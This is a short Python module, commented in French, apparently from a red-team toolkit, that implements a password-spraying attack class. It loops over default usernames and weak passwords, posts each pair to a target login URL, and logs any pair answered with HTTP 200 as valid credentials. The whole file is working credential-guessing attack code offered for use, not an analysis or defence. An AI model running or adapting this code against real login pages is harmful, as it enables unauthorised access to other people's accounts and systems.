import requests
from utils.logger import Logger

class Attack:
    def __init__(self):
        # Initialisation du logger
        self.logger = Logger("PasswordSpray")

    def setup(self, target_url, usernames=None, passwords=None, user_agent="PyRedTeam", **kwargs):
        if usernames is None:
            usernames = ["admin", "administrator"]
        if passwords is None:
            passwords = ["password", "admin123"]
        """Configuration de l'attaque"""
        # Stockage des paramètres
        self.target_url = target_url
        self.usernames = usernames  # Liste d'utilisateurs
        self.passwords = passwords  # Liste de mots de passe
        self.user_agent = user_agent  # User-Agent personnalisé

    def execute(self):
        """Exécution de l'attaque par pulvérisation"""
        valid_creds = []  # Stocke les identifiants valides
        
        # Configuration des en-têtes HTTP
        headers = {'User-Agent': self.user_agent}
        
        # Double boucle sur utilisateurs et mots de passe
        for username in self.usernames:
            for password in self.passwords:
                try:
                    # Envoi de la requête POST
                    response = requests.post(
                        self.target_url,
                        data={'username': username, 'password': password},
                        headers=headers,
                        timeout=5  # Timeout court
                    )
                    
                    # Vérification de la réponse
                    if response.status_code == 200:
                        valid_creds.append((username, password))
                        self.logger.info(f"Credentials valides: {username}:{password}")
                
                except Exception as e:
                    # Gestion des erreurs réseau
                    self.logger.error(f"Erreur: {str(e)}")
        
        return {"valid_credentials": valid_creds}

    def cleanup(self):
        """Nettoyage post-attaque"""
        self.logger.info("Nettoyage des ressources...")